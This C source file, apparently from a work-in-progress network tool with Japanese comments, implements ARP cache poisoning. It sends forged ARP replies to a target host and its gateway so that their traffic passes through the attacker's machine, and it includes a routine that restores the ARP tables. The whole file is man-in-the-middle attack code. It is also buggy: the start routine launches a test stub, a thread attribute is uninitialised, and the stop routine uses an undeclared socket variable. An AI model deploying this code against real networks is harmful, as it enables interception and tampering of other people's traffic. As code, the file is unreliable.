#include <stdio.h>
#include <pthread.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <pthread.h>

#include "sock.h"
#include "ether.h"
#include "arp.h"
#include "param.h"
#include "arp_poison.h"

extern PARAM Param;

int isPoisoning = 0;

struct in_addr target_addr;
struct in_addr gateway_addr;
u_int8_t t_mac[6];
u_int8_t g_mac[6];

/*
フラグ(isPoisonig=true)が立っている場合は、
攻撃対象に対して偽装したARP Replyを送り続ける
thread化する予定
*/
void *PoisonThread(void * arg)
{
    if(isPoisoning != 1){ return; }

    printf("poisoning now.\n");
    union {
        u_int32_t l;
        u_int8_t c[4];
    }m_addr, t_addr, g_addr;

    //targetPCのIPアドレス
    t_addr.l = target_addr.s_addr;
    //gatewayのIPアドレス
    g_addr.l = gateway_addr.s_addr;
    //my IP Address
    m_addr.l = Param.vip.s_addr;

    ArpSearchTable(target_addr, t_mac);
    ArpSearchTable(gateway_addr, g_mac);
    
    int soc = GetDeviceSoc();
    // send ARP Reply to target PC
    ArpSend
    (
        soc,         //soc
        ARPOP_REPLY, //op
        Param.vmac,  //e_smac 自分から送る gatewayでも良い？
        t_mac,       //e_dmac targetに送る
        Param.vmac,  //smac   自分のMACを送る(本来ならgateway)
        t_mac,       //dmac   targetのMACを送る
        g_addr.c,    //saddr  gatewayのIPアドレス
        t_addr.c     //daddr  targetのIPアドレス
    );

    // send ARP Repley to target gateway
    ArpSend
    (
        soc,         //soc
        ARPOP_REPLY, //op
        Param.vmac,  //e_smac 自分から送る targetでも良い？
        g_mac,       //e_dmac gatewayに送る
        Param.vmac,  //smac   自分のMACを送る(本来ならtarget)
        g_mac,       //dmac   gatewayのMACを送る
        t_addr.c,    //saddr  targetのIPアドレス
        g_addr.c     //daddr  gatewayのIPアドレス
    );

}

void *PoisonTest(void * arg)
{
    printf("POISON TEST\n");
}

void StartPoison(int soc, struct in_addr *target, struct in_addr *gateway)
{
    isPoisoning = 1;
    target_addr = *target;
    gateway_addr = *gateway;

    pthread_attr_t attr;
    pthread_t thread_id;

    if(pthread_create(&thread_id, &attr, PoisonTest, NULL) != 0)
    {
        printf("pthread_create ArpPoison\n");
    }
}

void StopPoison(void)
{
    printf("[*]Stop ARP Poison");

    if(isPoisoning != 1){ return; }

    union {
        u_int32_t l;
        u_int8_t c[4];
    }t_addr, g_addr;

    //targetPCのIPアドレス
    t_addr.l = target_addr.s_addr;
    //gatewayのIPアドレス
    g_addr.l = gateway_addr.s_addr;

    int i;
    // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
    for(i = 0; i < 5; i++)
    {
        // targetに正しいgatewayに関するARP Replyを送信
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る
            t_mac,       //e_dmac targetに送る
            g_mac,       //smac   gatewayのMACを送る
            t_mac,       //dmac   targetのMACを送る
            g_addr.c,    //saddr  gatewayのIPアドレス
            t_addr.c     //daddr  targetのIPアドレス
        );

        // gatewayに正しいARP Replyを送信
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る
            g_mac,       //e_dmac gatewayに送る
            t_mac,       //smac   targetのMACを送る
            g_mac,       //dmac   gatewayを送る
            t_addr.c,    //saddr  targetのIPアドレス
            g_addr.c     //daddr  gatewayのIPアドレス
        );
    }

    isPoisoning = 0;
}
